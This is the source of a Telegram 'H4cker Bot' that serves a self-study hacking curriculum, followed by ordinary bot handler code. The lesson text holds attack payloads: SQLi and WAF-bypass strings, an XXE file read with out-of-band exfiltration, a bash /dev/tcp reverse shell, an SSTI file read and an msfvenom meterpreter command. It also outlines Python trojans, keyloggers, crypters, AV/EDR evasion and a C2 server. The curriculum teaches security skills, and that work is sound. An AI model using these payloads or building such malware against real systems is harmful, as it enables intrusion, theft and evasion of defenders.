    "*🧠 Topics Covered:*\n"
    "- What is a C2 and how it works\n"
    "- Tools: Sliver, Covenant, Metasploit C2\n"
    "- Persistence via registry, tasks, startup\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Install Sliver:\n"
    "   ```bash\n"
    "   go install github.com/BishopFox/sliver@latest\n"
    "   sliver-server\n"
    "   ```\n"
    "2. Create listener and implant\n"
    "3. Add persistence via scheduled tasks\n\n"
    "*✅ Outcome:*\n"
    "- You can control and persist in a compromised system securely.",

"day67": "*📅 Day 67: Red Team Ops + Blue Team Detection*\n\n"
    "Now combine all Red Team skills while learning how Blue Teams detect you.\n\n"
    "*🧠 Topics Covered:*\n"
    "- SIEM logging & detection (Splunk/ELK)\n"
    "- Windows Event IDs to monitor\n"
    "- Detection bypass techniques\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Simulate full attack chain: phishing → payload → pivot → persistence\n"
    "2. Use Splunk or ELK stack to monitor logs:\n"
    "   - Logon events (4624)\n"
    "   - Scheduled task creation (4698)\n"
    "   - PowerShell logging (4104)\n"
    "3. Write a Red vs Blue report:\n"
    "   - What was done\n"
    "   - What got detected\n"
    "   - Recommendations\n\n"
    "*✅ Outcome:*\n"
    "- You can conduct and analyze full Red Team operations with defender awareness.",

    "day68": "*📅 Day 68: Advanced SQL Injection & WAF Bypass*\n\n"
             "Explore complex SQLi cases and learn how to bypass security filters.\n\n"
             "*🧠 Topics Covered:*\n"
             "- Boolean-based and Time-based Blind SQLi\n"
             "- Out-of-Band SQLi via DNS or HTTP\n"
             "- Bypassing WAFs with encodings, comments, case tampering\n\n"
             "*🛠️ Practical Tasks:*\n"
             "1. Test Boolean-based blind SQLi using payloads like `' OR 1=1-- -`\n"
             "2. Use time delay: `' OR IF(1=1, SLEEP(5), 0)-- -`\n"
             "3. Use `sqlmap` with tamper scripts: `--tamper=space2comment`\n"
             "4. Practice WAF bypass using:\n"
             "   - Inline comments: `UN/**/ION/**/SELECT`\n"
             "   - Hex encoding: `0x61646d696e`\n\n"
             "*✅ Outcome:* Confident exploitation of hardened SQLi with WAF bypass techniques.",

    "day69": "*📅 Day 69: SSRF & Internal Services Exploitation*\n\n"
             "Server-Side Request Forgery (SSRF) allows interaction with internal services.\n\n"
             "*🧠 Topics Covered:*\n"
             "- Identifying SSRF vulnerabilities\n"
             "- Accessing internal services & cloud metadata (AWS, GCP)\n"
             "- SSRF payloads using Gopher and FTP\n\n"
             "*🛠️ Practical Tasks:*\n"
             "1. Detect SSRF using Burp Collaborator\n"
             "2. SSRF attack to access: `http://169.254.169.254/latest/meta-data/`\n"
             "3. Try Gopher payload for Redis injection\n"
             "4. Use SSRF Labs on PortSwigger\n\n"
             "*✅ Outcome:* Understand and exploit SSRF to pivot into internal network.",

    "day70": "*📅 Day 70: XXE (XML External Entity) Injection*\n\n"
             "Use XML payloads to access local files and internal services.\n\n"
             "*🧠 Topics Covered:*\n"
             "- Basics of DTD and XXE\n"
             "- File Disclosure and SSRF via XXE\n"
             "- Blind XXE using out-of-band channels\n\n"
             "*🛠️ Practical Tasks:*\n"
             "1. Inject DTD-based payload:\n"
             "```xml\n"
             "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n"
             "<foo>&xxe;</foo>\n"
             "```\n"
             "2. Test Blind XXE via DNS or HTTP:\n"
             "`<!ENTITY % data SYSTEM 'http://your-server.com/leak'>`\n"
             "3. Use Burp Repeater and try different XML body injections\n\n"
             "*✅ Outcome:* Ability to perform full XXE attacks and detect unsafe parsers.",

    "day71": "*📅 Day 71: Command Injection & RCE Deep Dive*\n\n"
             "Abuse OS-level command execution in web apps.\n\n"
             "*🧠 Topics Covered:*\n"
             "- Command injection vs Code Injection\n"
             "- Bypassing input validation with `${IFS}`, semicolons\n"
             "- Blind RCE and reverse shells\n\n"
             "*🛠️ Practical Tasks:*\n"
             "1. Use payloads: `127.0.0.1; whoami`\n"
             "2. Blind RCE with `sleep 5`\n"
             "3. Reverse shell payload:\n"
             "`;bash -i >& /dev/tcp/YOUR-IP/4444 0>&1`\n"
             "4. Netcat listener on attacker side: `nc -lnvp 4444`\n\n"
             "*✅ Outcome:* Capable of finding and exploiting blind/visible command injection.",

    "day72": "*📅 Day 72: Template Injection & SSTI*\n\n"
             "Abuse template engines (Jinja2, Twig, etc.) to execute code.\n\n"
             "*🧠 Topics Covered:*\n"
             "- Identifying SSTI with test inputs (`{{7*7}}`)\n"
             "- Bypassing filters and reaching RCE\n"
             "- Accessing Python objects in Flask (Jinja2)\n\n"
             "*🛠️ Practical Tasks:*\n"
             "1. Test payloads: `{{7*7}}`, `{{config.items()}}`\n"
             "2. Exploit RCE in Jinja2:\n"
             "`{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}`\n"
             "3. Try SSTI in other engines like Twig (PHP), Velocity (Java)\n\n"
             "*✅ Outcome:* You can exploit insecure template rendering for RCE.",

    "day73": "*📅 Day 73: Subdomain Takeover & DNS Tricks*\n\n"
             "Hijack forgotten DNS entries and host your own content.\n\n"
             "*🧠 Topics Covered:*\n"
             "- What is a dangling CNAME\n"
             "- Tools for takeover: Subjack, Nuclei, Subzy\n"
             "- Real-world examples: S3, GitHub Pages, Heroku\n\n"
             "*🛠️ Practical Tasks:*\n"
             "1. Enumerate subdomains: `subfinder`, `amass`\n"
             "2. Check vulnerable subdomains: `subjack -w domains.txt`\n"
             "3. Deploy takeover page on GitHub\n"
             "4. Validate takeover with `curl` and HTTP 404s\n\n"
             "*✅ Outcome:* Able to identify and simulate subdomain hijacks.",

    "day74": "*📅 Day 74: Burp Suite Automation + Custom Extensions*\n\n"
             "Automate testing and build Burp extensions.\n\n"
             "*🧠 Topics Covered:*\n"
             "- Macros, session handling, and Intruder payloads\n"
             "- BApp Store extensions\n"
             "- Writing custom Jython extensions\n\n"
             "*🛠️ Practical Tasks:*\n"
             "1. Create login macro for authenticated scans\n"
             "2. Use Turbo Intruder to fuzz parameters\n"
             "3. Write an extension using `IBurpExtender`\n"
             "4. Install Autorize to test auth-based access control\n\n"
             "*✅ Outcome:* Advanced Burp automation for large-scale testing.",


    "day75": "*📅 Day 75: APK Structure & Tools Setup*\n\n"
             "Begin Android reverse engineering by unpacking APK files and configuring analysis tools.\n\n"
             "*🧠 Topics Covered:*\n"
             "- APK structure: AndroidManifest.xml, classes.dex, resources.arsc\n"
             "- Tool setup: apktool, JADX (GUI + CLI), Mobile Security Framework (MobSF)\n\n"
             "*🛠️ Practical Tasks:*\n"
             "1. Decompile APK using `apktool d app.apk` to extract Smali code\n"
             "2. Use `jadx-gui app.apk` to analyze Java source code\n"
             "3. Run MobSF (`python manage.py runserver`) and upload the APK\n"
             "4. Review permissions, exported components, and API key leaks\n\n"
             "*✅ Outcome:* Able to set up tools and break down APK files for analysis.",

    "day76": "*📅 Day 76: Static Code Analysis with JADX & apktool*\n\n"
             "Analyze decompiled APKs to find logic flaws, hardcoded credentials, and weak API usage.\n\n"
             "*🧠 Topics Covered:*\n"
             "- Decompiled Java (JADX) vs Smali (apktool)\n"
             "- Recognizing insecure practices in static code\n\n"
             "*🛠️ Practical Tasks:*\n"
             "1. Locate `onCreate()` methods and look for hardcoded keys or secrets\n"
             "2. Search for API endpoints, tokens, and debug info using `grep`/JADX search\n"
             "3. Document all URLs, keys, and intents for dynamic analysis\n\n"
             "*✅ Outcome:* Mastery in analyzing static code for security misconfigurations and data exposure.",

    "day77": "*📅 Day 77: Smali Code & Logic Modification*\n\n"
             "Modify APK behavior by editing Smali code and rebuilding it.\n\n"
             "*🧠 Topics Covered:*\n"
             "- Smali syntax and control flow\n"
             "- Patching login or premium check logic\n"
             "- APK signing and alignment\n\n"
             "*🛠️ Practical Tasks:*\n"
             "1. Modify Smali code to bypass login check (e.g., change `if-eqz` to `goto`)\n"
             "2. Rebuild using `apktool b app`\n"
             "3. Sign with test key:\n"
             "`jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore debug.keystore app.apk androiddebugkey`\n"
             "4. Install APK on emulator and verify patched behavior\n\n"
             "*✅ Outcome:* Able to modify and patch application logic effectively.",

    "day78": "*📅 Day 78: Frida & Objection - Runtime Instrumentation*\n\n"
             "Use dynamic instrumentation tools to hook and modify apps at runtime.\n\n"
             "*🧠 Topics Covered:*\n"
             "- Installing Frida and Objection\n"
             "- Live function hooking, bypassing root/Jailbreak checks\n"
             "- Dynamic dumping of loaded classes and methods\n\n"
             "*🛠️ Practical Tasks:*\n"
             "1. Connect to device with `adb shell` and launch Frida server\n"
             "2. Use: `objection --gadget com.victim.app explore`\n"
             "3. Bypass root detection:\n"
             "`android root-detection bypass` (Objection command)\n"
             "4. Dump strings or runtime variables using `memory watch`\n\n"
             "*✅ Outcome:* Runtime app modification and security check bypassing skills unlocked.",

    "day79": "*📅 Day 79: SSL Pinning & Root Detection Bypass*\n\n"
             "Bypass security mechanisms preventing proxying and debugging.\n\n"
             "*🧠 Topics Covered:*\n"
             "- SSL pinning mechanisms (TrustManager, OkHTTP)\n"
             "- Root detection via Build.TAGS, BusyBox, etc.\n\n"
             "*🛠️ Practical Tasks:*\n"
             "1. Identify pinning libraries using JADX or MobSF\n"
             "2. Inject Frida script to override `checkServerTrusted()`\n"
             "3. Hook native methods via Frida:\n"
             "`Java.use('javax.net.ssl.X509TrustManager')`\n"
             "4. Confirm Burp Suite MITM working after hook\n\n"
             "*✅ Outcome:* Successfully bypass SSL pinning and root detection for secure app analysis.",

    "day80": "*📅 Day 80: Hooking Android Functions with Frida*\n\n"
             "Gain full control over function execution during app runtime.\n\n"
             "*🧠 Topics Covered:*\n"
             "- Hooking Java and native methods\n"
             "- Monitoring function calls and manipulating return values\n\n"
             "*🛠️ Practical Tasks:*\n"
             "1. Hook methods like `getDeviceId()` or `getSharedPreferences()`\n"
             "2. Modify return value using:\n"
             "```js\n"
             "Java.perform(function () {\n"
             "  var target = Java.use('android.telephony.TelephonyManager');\n"
             "  target.getDeviceId.implementation = function() {\n"
             "    return '1234567890';\n"
             "  }\n"
             "});\n"
             "```\n"
             "3. Log data with `send()` and analyze in real time\n\n"
             "*✅ Outcome:* Able to intercept and modify any app behavior at runtime.",

    "day81": "*📅 Day 81: Full Mobile App Exploitation & Reporting*\n\n"
             "Combine all techniques into a full audit and structured report.\n\n"
             "*🧠 Topics Covered:*\n"
             "- Bug bounty triage for Android\n"
             "- Documentation and Proof of Concept (PoC) writing\n\n"
             "*🛠️ Practical Tasks:*\n"
             "1. Analyze full APK (e.g., CTF APK or challenge)\n"
             "2. Find at least 3 vulnerabilities (e.g., hardcoded secrets, broken auth)\n"
             "3. Write PoC steps with screenshots, payloads, and impact\n"
             "4. Export to PDF using `markdown -> pandoc` or report templates\n\n"
             "*✅ Outcome:* End-to-end mobile app audit with proper security report ready.",

    "day82": "*📅 Day 82: Malware Types & Safe Lab Setup*\n\n"
             "Prepare your system for malware testing and understand the ecosystem.\n\n"
             "*🧠 Topics Covered:*\n"
             "- Types of malware: RATs, Trojans, Worms, Droppers\n"
             "- Setting up analysis lab with FLARE-VM or REMnux\n\n"
             "*🛠️ Practical Tasks:*\n"
             "1. Install FLARE-VM on isolated Windows machine\n"
             "2. Set up host-only networking\n"
             "3. Install tools: PEStudio, Wireshark, Process Explorer\n\n"
             "*✅ Outcome:* Fully isolated and safe environment for malware development and analysis.",

    "day83": "*📅 Day 83: Payload Generation with msfvenom*\n\n"
             "Create malware payloads for multiple platforms using Metasploit framework.\n\n"
             "*🧠 Topics Covered:*\n"
             "- Windows/Linux/Android payload formats\n"
             "- Avoiding basic antivirus detection\n\n"
             "*🛠️ Practical Tasks:*\n"
             "1. Create reverse shell: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOURIP LPORT=4444 -f exe > shell.exe`\n"
             "2. Start Metasploit handler:\n"
             "`use exploit/multi/handler`\n"
             "3. Execute payload in VM and test connection\n\n"
             "*✅ Outcome:* Competent in building and handling payloads using msfvenom.",

    "day84": "*📅 Day 84: Custom Python Trojans*\n\n"
             "Build simple Python-based malware with multiple features.\n\n"
             "*🧠 Topics Covered:*\n"
             "- Python reverse shells\n"
             "- Keylogging and screenshot capture\n"
             "- Persistence mechanisms\n\n"
             "*🛠️ Practical Tasks:*\n"
             "1. Write a Python script for reverse shell using `socket` and `subprocess`\n"
             "2. Add auto-start on boot via Registry (Windows) or `.bashrc` (Linux)\n"
             "3. Bundle with `pyinstaller` to create standalone EXE\n\n"
             "*✅ Outcome:* You can build basic yet functional custom malware in Python.",

    "day85": "*📅 Day 85: Obfuscation & Crypter Basics*\n\n"
             "Protect your payloads from detection using encryption and crypters.\n\n"
             "*🧠 Topics Covered:*\n"
             "- XOR/RC4 encryption for payloads\n"
             "- Stub creation and shellcode loaders\n\n"
             "*🛠️ Practical Tasks:*\n"
             "1. Encrypt payload with XOR cipher\n"
             "2. Create a Python stub that decrypts and executes at runtime\n"
             "3. Compile with `pyarmor` or `nuitka`\n\n"
             "*✅ Outcome:* Able to write basic FUD (Fully Undetectable) loaders and crypters.",

    "day86": "*📅 Day 86: Antivirus & EDR Evasion Techniques*\n\n"
             "Learn to evade common AV and EDR detection strategies.\n\n"
             "*🧠 Topics Covered:*\n"
             "- Static vs behavioral analysis\n"
             "- API masking and string obfuscation\n\n"
             "*🛠️ Practical Tasks:*\n"
             "1. Obfuscate strings with base64 and runtime decode\n"
             "2. Use `Process Hollowing` in C or PowerShell\n"
             "3. Monitor with Defender + Sysmon to refine payloads\n\n"
             "*✅ Outcome:* Payloads that survive basic antivirus detection during red team exercises.",

    "day87": "*📅 Day 87: Building a Custom C2 Server*\n\n"
             "Design a simple Command & Control panel using Python and WebSockets.\n\n"
             "*🧠 Topics Covered:*\n"
             "- Flask + Socket.IO for server\n"
             "- Agent-client architecture\n"
             "- Command queuing, response handling\n\n"
             "*🛠️ Practical Tasks:*\n"
             "1. Create Flask server with `socketio.emit()` and `on('command')`\n"
             "2. Python client polls for commands and executes them\n"
             "3. Add encryption between client and server using Fernet\n\n"
             "*✅ Outcome:* Your own functional C2 server and client for post-exploitation control.",

    "day88": "*📅 Day 88: Malware Analysis & IOCs Extraction*\n\n"
             "Dissect real malware samples and extract forensic evidence.\n\n"
             "*🧠 Topics Covered:*\n"
             "- Static + Dynamic analysis\n"
             "- Indicators of Compromise (IOCs): IPs, domains, hashes\n\n"
             "*🛠️ Practical Tasks:*\n"
             "1. Use `strings`, `PEStudio`, `Procmon` to analyze malware\n"
             "2. Capture traffic with Wireshark and extract DNS/IPs\n"
             "3. Identify mutexes, dropped files, scheduled tasks\n\n"
             "*✅ Outcome:* Capable of reverse engineering malware and generating detailed IOCs.",











}
import json
import difflib
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler, CallbackQueryHandler,
    ContextTypes, filters
)

# -- Path to store user data --
USER_DATA_FILE = "users.json"

# -- Topics and content (assume these are defined globally) --
topics = {...}   # your topic dictionary
content = {...}  # your content dictionary

# -- Save/Load User Data --
def load_user_data():
    try:
        with open(USER_DATA_FILE, "r") as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_user_data(data):
    with open(USER_DATA_FILE, "w") as f:
        json.dump(data, f, indent=4)

def update_progress(user_id, day):
    users = load_user_data()
    users.setdefault(str(user_id), {})["current_day"] = day
    save_user_data(users)

def update_last_module(user_id, module, username):
    users = load_user_data()
    users.setdefault(str(user_id), {})
    users[str(user_id)]["last_module"] = module
    users[str(user_id)]["username"] = username
    save_user_data(users)

# -- UI Keyboard Generator --
def get_keyboard(topic):
    buttons = [[InlineKeyboardButton(text, callback_data=data)] for text, data in topics.get(topic, [])]
    if topic != "main":
        buttons.append([InlineKeyboardButton("⬅️ Back", callback_data="main")])
    return InlineKeyboardMarkup(buttons)

# -- /start command handler --
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "👋 Hey! I am *H4cker Bot* 🤖\n\nI'm here to teach you Ethical Hacking. Choose a topic below:",
        parse_mode="Markdown",
        reply_markup=get_keyboard("main")
    )

# -- Greeting handler --
async def greet_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.message.text.lower().strip()
    if msg in ["hi", "hello", "hii", "/start"]:
        await start(update, context)

# -- Callback Query handler --
async def handle_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    username = query.from_user.username or "N/A"
    topic_key = query.data
    await query.answer()

    # Save last module clicked
    update_last_module(user_id, topic_key, username)

    if topic_key in topics:
        await query.message.reply_text(
            text=content.get(topic_key, f"*{topic_key.capitalize()} Topics:*"),
            parse_mode="Markdown",
            reply_markup=get_keyboard(topic_key)
        )
    elif topic_key in content:
        await query.message.reply_text(content[topic_key], parse_mode="Markdown")
    else:
        await query.message.reply_text("❌ Invalid option. Please try again.")

# -- Keyword responder --
async def keyword_responder(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.message.text.lower().strip()
    if msg.startswith("/"):
        msg = msg[1:]
    if msg in content:
        await update.message.reply_text(content[msg], parse_mode="Markdown")
        return

    matches = difflib.get_close_matches(msg, content.keys(), n=1, cutoff=0.4)
    if matches:
        await update.message.reply_text(
            f"🔍 Showing result for *{matches[0]}*:\n\n{content[matches[0]]}",
            parse_mode="Markdown"
        )
    else:
        await update.message.reply_text("❌ I couldn't find info on that. Try using /start or typing a hacking keyword.")

# -- Dynamic command handler --
async def dynamic_command_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    command = update.message.text[1:].lower()
    if command in content:
        await update.message.reply_text(content[command], parse_mode="Markdown")
    else:
        await update.message.reply_text("❌ I don't have content for that command.")

# -- /owner command --
async def owner_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "*🤖 H4cker Bot Owners & Creators:*\n\n"
        "👨‍💻 *Ankit Kushwaha*\n"
        "• *Role:* Ethical Hacker | Full-Stack Developer\n"
        "• *Telegram:* [@H4cker_ank](https://t.me/H4cker_ank)\n"
        "• *GitHub:* [github.com/ankitkushwaha-ank](https://github.com/ankitkushwaha-ank)\n"
        "• *Email:* ankitkushwaha.ank@gmail.com\n\n"

        "👩‍💻 *Aayushi Kumari*\n"
        "• *Role:* Security Researcher | Cybersecurity Enthusiast\n"
        "• *Telegram:* [@Outlier](https://t.me/)\n"
        "• *GitHub:* [github.com/Aashi-code77](https://github.com/Aashi-code77)\n"
        "• *Email:* pandaoutlier@gmail.com\n\n"

        "💡 *About:* We created *H4cker Bot* to make cybersecurity learning accessible, structured, and fun. This bot provides a 30-day roadmap, tool-based tutorials, and career guidance for aspiring ethical hackers.\n\n"
        "_Keep exploring, keep learning, and always hack ethically!_ 🔐✨",
        parse_mode="Markdown",
        disable_web_page_preview=True
    )

# -- /help command --
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "*🆘 Help Menu:*\n\n"
        "Use commands:\n"
        "/start — Main menu\n"
        "/owner — Bot creator info\n"
        "/help — Show help\n"
        "Use commands like /day1, /nmap, /linux, etc. to explore topics.",
        parse_mode="Markdown"
    )

# -- /progress command --
async def show_progress(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    users = load_user_data()
    if user_id in users:
        day = users[user_id].get("current_day", 1)
        await update.message.reply_text(f"🚀 Your current progress: Day {day}")
    else:
        await update.message.reply_text("Welcome! Let's start your hacking journey! 🚀")

# -- Main App Initialization --
if __name__ == '__main__':
    TOKEN = "YOUR_BOT_TOKEN"  # Replace with your bot token
    app = ApplicationBuilder().token(TOKEN).build()

    # Commands
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("owner", owner_info))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("progress", show_progress))

    # Dynamic command handlers for /day1, /nmap, etc.
    for key in content.keys():
        app.add_handler(CommandHandler(key, dynamic_command_handler))

    # Text messages & button callbacks
    app.add_handler(CallbackQueryHandler(handle_buttons))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, keyword_responder))

    print("🚀 H4cker Bot is running...")
    app.run_polling()
